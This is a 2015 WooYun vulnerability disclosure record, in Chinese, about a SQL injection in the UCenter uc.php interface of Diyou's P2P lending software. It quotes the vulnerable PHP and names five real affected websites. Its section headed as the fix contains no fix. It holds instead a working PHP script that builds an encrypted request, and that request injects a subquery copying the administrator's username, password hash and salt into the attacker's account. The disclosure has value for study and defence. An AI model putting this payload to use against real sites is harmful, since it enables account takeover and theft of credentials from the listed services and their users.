{"id": 72660, "wybug_id": "wooyun-2015-0146539", "wybug_title": "帝友P2P借货系统某处文件设计缺陷可注入(任意登录/修改密码)", "wybug_corp": "厦门帝网信息科技有限公司", "wybug_author": "Xser", "wybug_date": "2015-10-14 10:45", "wybug_open_date": "2016-01-17 10:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-22：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向公众公开  简要描述： 如题如题 详细说明：  出现在uc接口文件上modules\\ucenter\\api\\uc.php\nerror_reporting(7);define('UC_CLIENT_ROOT', DISCUZ_ROOT.'./client/');chdir('../');require_once './config.inc.php';$code = $_GET['code'];parse_str(authcode($code, 'DECODE', UC_KEY), $get);if(MAGIC_QUOTES_GPC) {\t$get = dstripslashes($get);}\n没有判断uc是否开关而且\nif(MAGIC_QUOTES_GPC) {\t$get = dstripslashes($get)\n这里把gpc去掉了\nfunction authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {\t$ckey_length = 4;\t$key = md5($key ? $key : UC_KEY);\t$keya = md5(substr($key, 0, 16));\t$keyb = md5(substr($key, 16, 16));\t$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';\t$cryptkey = $keya.md5($keya.$keyc);\t$key_length = strlen($cryptkey);\t$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\t$string_length = strlen($strin\n自带的加密函数，key默认是空的所以导致注入了\nelseif($action == 'renameuser') {\t!API_RENAMEUSER && exit(API_RETURN_FORBIDDEN);\t//用户改名 API 接口\t$uid = $get['uid'];\t$usernamenew = $get['newusername'];\t$db->query(\"UPDATE {$tablepre}members SET username='$usernamenew' WHERE uid='$uid'\");\texit(API_RETURN_SUCCEED);\n随便找到一处可以注入\n\n案例：\nwww.jinmaoweidai.com www.herunwang.com syziben.com www.lcbang.cn www.cheyidai88.com\n   漏洞证明：  出现在uc接口文件上modules\\ucenter\\api\\uc.php\nerror_reporting(7);define('UC_CLIENT_ROOT', DISCUZ_ROOT.'./client/');chdir('../');require_once './config.inc.php';$code = $_GET['code'];parse_str(authcode($code, 'DECODE', UC_KEY), $get);if(MAGIC_QUOTES_GPC) {\t$get = dstripslashes($get);}\n没有判断uc是否开关而且\nif(MAGIC_QUOTES_GPC) {\t$get = dstripslashes($get)\n这里把gpc去掉了\nfunction authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {\t$ckey_length = 4;\t$key = md5($key ? $key : UC_KEY);\t$keya = md5(substr($key, 0, 16));\t$keyb = md5(substr($key, 16, 16));\t$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';\t$cryptkey = $keya.md5($keya.$keyc);\t$key_length = strlen($cryptkey);\t$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\t$string_length = strlen($strin\n自带的加密函数，key默认是空的所以导致注入了\nelseif($action == 'renameuser') {\t!API_RENAMEUSER && exit(API_RETURN_FORBIDDEN);\t//用户改名 API 接口\t$uid = $get['uid'];\t$usernamenew = $get['newusername'];\t$db->query(\"UPDATE {$tablepre}members SET username='$usernamenew' WHERE uid='$uid'\");\texit(API_RETURN_SUCCEED);\n随便找到一处可以注入\n\n案例：\nwww.jinmaoweidai.com www.herunwang.com syziben.com www.lcbang.cn www.cheyidai88.com\n   修复方案：  \n<?php $_G['time'] =  time()+10*36000;$_G['action'] =  'renameuser';$_G['newusername'] = \"xser',email=(SELECT ROW FROM(SELECT CONCAT(userid,0x7c,username,0x7c,PASSWORD,0x7c,salt) ROW FROM #table_member WHERE userid = 1 limit 0,1)X1 )  where username = 'xser' #\";// 数据更新到你的账号上。$code = urlencode(_authcode(http_build_query($_G), 'ENCODE'));echo $code;function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {\t$ckey_length = 4;\t$key = md5($key ? $key : UC_KEY);\t$keya = md5(substr($key, 0, 16));\t$keyb = md5(substr($key, 16, 16));\t$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';\t$cryptkey = $keya.md5($keya.$keyc);\t$key_length = strlen($cryptkey);\t$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\t$string_length = strlen($string);\t$result = '';\t$box = range(0, 255);\t$rndkey = array();\tfor($i = 0; $i <= 255; $i++) {\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t}\tfor($j = $i = 0; $i < 256; $i++) {\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\t\t$tmp = $box[$i];\t\t$box[$i] = $box[$j];\t\t$box[$j] = $tmp;\t}\tfor($a = $j = $i = 0; $i < $string_length; $i++) {\t\t$a = ($a + 1) % 256;\t\t$j = ($j + $box[$a]) % 256;\t\t$tmp = $box[$a];\t\t$box[$a] = $box[$j];\t\t$box[$j] = $tmp;\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\t}?>\n   版权声明：转载请注明来源 Xser@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-19 10:27 厂商回复： 感谢您的提交，在我们早期的V3版本中确实存在这类的问题，已提交研发部门进行相关漏洞的修复，再次感谢您对我们帝友的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-14 11:02 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:262 漏洞数:66        | baozisec)\t\t \n  UC.php  ?    \n     2015-10-14 12:36 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:789 漏洞数:150        | http://menmen519.blog.sohu.com/)\t\t \n  你把我都刷屏了 厉害    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}